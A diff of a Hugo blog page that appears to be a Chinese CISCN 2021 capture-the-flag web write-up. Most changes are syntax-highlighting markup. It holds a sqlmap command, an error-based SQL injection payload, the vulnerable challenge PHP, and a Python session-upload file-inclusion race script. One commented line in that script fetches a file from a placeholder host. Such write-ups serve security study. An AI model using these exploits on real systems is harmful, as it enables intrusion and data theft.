@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -282,18 +282,18 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python sqlmap.py -u http://124.70.96.30:24321/ --data <span class="s2">&#34;uname=admin&amp;passwd=admn&amp;Submit=%E7%99%BB%E5%BD%95&#34;</span> -D <span class="s2">&#34;security&#34;</span> --tables
-Database: security
-<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
-+-------+
-<span class="p">|</span> flag  <span class="p">|</span>
-<span class="p">|</span> users <span class="p">|</span>
-+-------+
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python sqlmap.py -u http://124.70.96.30:24321/ --data <span class="s2">&#34;uname=admin&amp;passwd=admn&amp;Submit=%E7%99%BB%E5%BD%95&#34;</span> -D <span class="s2">&#34;security&#34;</span> --tables
+</span></span><span class="line"><span class="cl">Database: security
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+-------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> flag  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------+
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>无列名注入只能注出部分flag<code>CISCN{ZI9VA-3PWY5-S9RKF-O3I1T-Q3CEN-</code>，后面部分注不出来了，需要尝试别的方法。参考<a href="https://www.cnblogs.com/GH-D/p/11962522.html" target="_blank" rel="noopener">https://www.cnblogs.com/GH-D/p/11962522.html</a>使用join获得列名然后直接报错注入获得flag。</p>
 <p>payload</p>
-<pre tabindex="0"><code>admin')||(extractvalue(1,concat(0x7e,substr((select`33faf19d-e30e-45a7-8aca-3272c975f54f`from`flag`),10),0x7e)))#
+<pre tabindex="0"><code>admin&#39;)||(extractvalue(1,concat(0x7e,substr((select`33faf19d-e30e-45a7-8aca-3272c975f54f`from`flag`),10),0x7e)))#
 # CISCN{zi9vA-3pwY5-S9rKf-o3I1t-Q3CeN-}
 </code></pre><h2 id="web-easy_source"><a href="#web-easy_source" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-easy_source" class="headings">web-easy_source</a></h2>
 <blockquote>
@@ -418,121 +418,121 @@ Database: security
 </span><span class="lnt">114
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span>
-<span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">User</span>
-<span class="p">{</span>
-    <span class="k">private</span> <span class="k">static</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-
-    <span class="k">function</span> <span class="nf">a</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">b</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">c</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">d</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">e</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">f</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">g</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">h</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">i</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">j</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">k</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">l</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">m</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">n</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">o</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">p</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">q</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">r</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">s</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">t</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-<span class="p">}</span>
-
-<span class="nv">$rc</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rc&#34;</span><span class="p">];</span>
-<span class="nv">$rb</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rb&#34;</span><span class="p">];</span>
-<span class="nv">$ra</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ra&#34;</span><span class="p">];</span>
-<span class="nv">$rd</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rd&#34;</span><span class="p">];</span>
-<span class="nv">$method</span><span class="o">=</span> <span class="k">new</span> <span class="nv">$rc</span><span class="p">(</span><span class="nv">$ra</span><span class="p">,</span> <span class="nv">$rb</span><span class="p">);</span>
-<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$method</span><span class="o">-&gt;</span><span class="nv">$rd</span><span class="p">());</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">static</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">a</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">b</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">c</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">d</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">e</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">f</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">g</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">h</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">i</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">j</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">k</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">l</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">m</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">n</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">o</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">p</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">q</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">r</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">s</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">t</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$rc</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rc&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rb</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rb&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ra</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ra&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rd</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rd&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$method</span><span class="o">=</span> <span class="k">new</span> <span class="nv">$rc</span><span class="p">(</span><span class="nv">$ra</span><span class="p">,</span> <span class="nv">$rb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$method</span><span class="o">-&gt;</span><span class="nv">$rd</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/" target="_blank" rel="noopener">fslh-writeup | r0yanx's Blog</a></p>
 <p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120956.png" alt=""></p>
@@ -557,23 +557,23 @@ Database: security
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="s2">&#34;your flag is in some file in /etc &#34;</span><span class="p">;</span>
-    <span class="nv">$fielf</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;field&#34;</span><span class="p">];</span>
-    <span class="nv">$cf</span><span class="o">=</span><span class="s2">&#34;/tmp/app_auth/cfile/&#34;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cf&#39;</span><span class="p">];</span>
-    
-    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$cf</span><span class="p">)){</span>
-        <span class="k">include</span> <span class="nv">$cf</span><span class="p">;</span>
-        <span class="k">echo</span> <span class="nv">$$field</span><span class="p">;</span>
-        <span class="k">exit</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">else</span><span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-        <span class="k">exit</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err"> your flag is in some file in /etc 
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;your flag is in some file in /etc &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fielf</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;field&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$cf</span><span class="o">=</span><span class="s2">&#34;/tmp/app_auth/cfile/&#34;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cf&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$cf</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="nv">$cf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$$field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> your flag is in some file in /etc 
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫目录扫到<code>/.listing</code>路由，访问得到文件信息</p>
 <pre tabindex="0"><code>total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 .
@@ -616,37 +616,37 @@ drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">io</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-<span class="n">sessID</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.96.30:24381/&#39;</span>
-<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php phpinfo();?&gt;&#39;}</span>
-        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php echo(&#34;PWN!!!&#34;);copy(&#34;http://IP/x.txt&#34;,&#34;/tmp/pwn&#34;);?&gt;&#39;}</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php show_source(&#34;/etc/ibcdajejbd/fhccbdadhd/abeadaafbb/iddjieeddf/gihbgceded/fl444444g&#34;);?&gt;&#39;</span><span class="p">}</span>
-        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">256</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessID</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)}</span>
-        <span class="p">)</span>
-<span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-            <span class="s2">&#34;field&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-            <span class="s2">&#34;cf&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../../../../../../var/lib/php/sessions/ddfdafcded/sess_&#34;</span> <span class="o">+</span> <span class="n">sessID</span><span class="p">,</span>
-        <span class="p">}</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-        <span class="k">if</span> <span class="s1">&#39;CISCN&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-            <span class="k">break</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] trying&#34;</span><span class="p">)</span>
-<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-<span class="n">write</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span>
-<span class="n">write</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">write</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-<span class="n">read</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
